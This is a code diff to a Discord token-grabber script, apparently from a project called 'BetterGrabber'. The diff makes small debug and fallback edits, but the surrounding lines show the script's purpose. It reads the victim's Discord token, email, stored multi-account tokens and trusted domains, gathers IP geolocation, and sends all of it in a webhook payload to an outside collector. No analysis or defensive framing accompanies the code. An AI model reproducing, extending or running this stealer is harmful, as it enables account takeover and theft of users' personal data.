@@ -128,7 +128,6 @@ class HideMe {
             if(IPInfos.includes("Too Many Requests")){
                 IPInfos = "Too Many Requests";
             } else {
-                console.log(IPInfos);
                 IPInfos = JSON.parse(IPInfos);
                 IPInfos = `Hostname => "${IPInfos["hostname"]}"\nCountry => "${IPInfos["country"]}"\nPotential Location: "Lat: ${IPInfos["loc"].replace(",", " / Long: ")}\nISP: ${IPInfos["asn"]["name"]} (WebSite: ${IPInfos["asn"]["domain"]} / Route: ${IPInfos["asn"]["route"]})"\nType: "${IPInfos["privacy"]["vpn"] ? "VPN" : IPInfos["privacy"]["proxy"] ? "Proxy" : IPInfos["privacy"]["tor"] ? "Tor" : IPInfos["privacy"]["relay"] ? "Relay" : IPInfos["privacy"]["Hosting"] ? "Hosting" : "Not detected, good proxy or Real IP"}"`;
             }
@@ -144,6 +143,7 @@ class HideMe {
         //var actualUserSettings = await getLocalStorageInfo("UserSettingsStore"); //Pretty Big
         var actualUserEmail = await getLocalStorageInfo("email_cache");
         var actualUserPremiumState = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser())).premiumType;if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser())).premiumType}}]);
+        console.log(actualUserPremiumState)
         var storedTokens = await getLocalStorageInfo("tokens"); // For New Multi Account System
         var trustedDomains = await getLocalStorageInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
         var verifiedGameAndProgramsList = await getLocalStorageInfo("GameStoreReportedGames"); //List of VERIFIED games/programs
@@ -153,7 +153,7 @@ class HideMe {
             username: config.webhookUsername,
             avatar_url: config.webhookAvatar,
             tts: config.tts,
-            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.8" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos}\`\`\`\n[More Infos about ${IP}](https://whatismyipaddress.com/ip/${IP})`, inline: false }]}]
+            embeds: [{"title": config.embedTitle, "footer": { "text": "Version: 1.1.8" }, "description": "[GitHub](https://github.com/HideakiAtsuyo/BetterGrabber)", "color": config.embedColor, "fields": [{ "name": "IP", "value": `\`${IP}\``, inline: false }, { "name": "Actual User Token", "value": `\`${actualUserToken.replaceAll("\"", "")||"Unknown Issue"}\``, inline: true }, { "name": "Actual User Tag With ID", "value": `\`${actualUserTag.replaceAll("\"", "")}\` - (\`${actualUserID.replaceAll("\"", "")}\`)`, inline: true }, { "name": "Actual User email", "value": `\`${actualUserEmail.replaceAll("\"", "")}\``, inline: true }, { "name": "Actual User Premium Status(Nitro)", "value": `\`${["No", "Classic", "Boost"][actualUserPremiumState]||"No"}\``, inline: true }, { "name": "Trusted Domains List", "value": `\`\`\`\n${trustedDomains == undefined ? "null" : JSON.parse(trustedDomains)["trustedDomains"]}\`\`\``, inline: false }, { "name": "Stored Tokens(From Switch Account Feature :) (ID:Token))", "value": `\`\`\`json\n${storedTokens == undefined ? "null" : storedTokens}\`\`\``, inline: false }, { "name": "Verified Games & Programs", "value": `\`\`\`json\n${verifiedGameAndProgramsList == undefined ? "null": verifiedGameAndProgramsList}\`\`\``, inline: false }, { "name": "IP Infos", "value": `\`\`\`json\n${IPInfos}\`\`\`\n[More Infos about ${IP}](https://whatismyipaddress.com/ip/${IP})`, inline: false }]}]
         });
 
         //console.log(pD); //Only Used To Check The Actual Payload Nothing More :)
